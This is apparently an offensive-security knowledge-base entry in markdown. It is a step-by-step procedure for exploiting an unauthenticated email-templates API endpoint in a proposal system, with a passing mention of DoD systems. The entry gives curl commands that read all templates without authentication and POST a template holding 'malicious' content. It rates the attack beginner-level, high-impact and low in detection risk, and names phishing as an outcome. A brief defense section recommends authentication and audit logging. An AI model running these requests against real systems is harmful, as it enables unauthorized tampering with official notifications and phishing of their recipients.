---
tags:
  - unauth-access
  - email-manipulation
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-get-email-templates-endpoint]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:01.595Z'
skill_level: beginner
impact_level: high
detection_risk: low
sub_techniques: []
id: b809f2fb-0e37-4d7b-a001-77753dcf6f51
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Access-and-Manipulate-Email-Templates-Endpoint

## Summary

This procedure allows unauthenticated access to view add modify or delete email templates in the proposal system's API compromising communication security.

## Description

The /api/1_0/EmailTemplates endpoint lacks protection enabling full CRUD operations via HTTP requests. In the context of DoD systems this exposes templates for sensitive notifications allowing tampering that could mislead users or insert malicious content. From Swagger discovery the procedure assumes public access; outcomes include template control for phishing or data alteration.

## Requirements

1. Endpoint URL from API docs
2. HTTP client like curl
3. JSON payload knowledge for POST/PUT

## Defense

Defensive measures and detection strategies:

- Require authentication for template management endpoints
- Audit logs for changes to email templates
- Validate and sanitize all template inputs server-side

## Objectives

1. Retrieve existing email templates
2. Demonstrate modification or deletion capabilities
3. Highlight risks to system integrity

## Instructions

### Step 1: Retrieve Templates

**Context**: GET the list of templates without auth.

**Command** ([[commands/curl-get-email-templates-endpoint]]):
```bash
curl -X GET "https://target/api/1_0/EmailTemplates" -H "Accept: application/json"
```

> Expected output: JSON array of templates e.g. {"templates": [{"id":1,"content":"Welcome..."}]}.

### Step 2: Test Manipulation

**Context**: Attempt to add or modify a template.

**Command**:
```bash
curl -X POST "https://target/api/1_0/EmailTemplates" -H "Content-Type: application/json" -d '{"name":"test","content":"malicious"}'
```

> Expected output: 201 Created or similar confirming addition; indicates full control.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-get-email-templates-endpoint]]

## Tools Used

- [[tools/curl]]

## Tags

- [[unauth-access]]
- [[email-manipulation]]
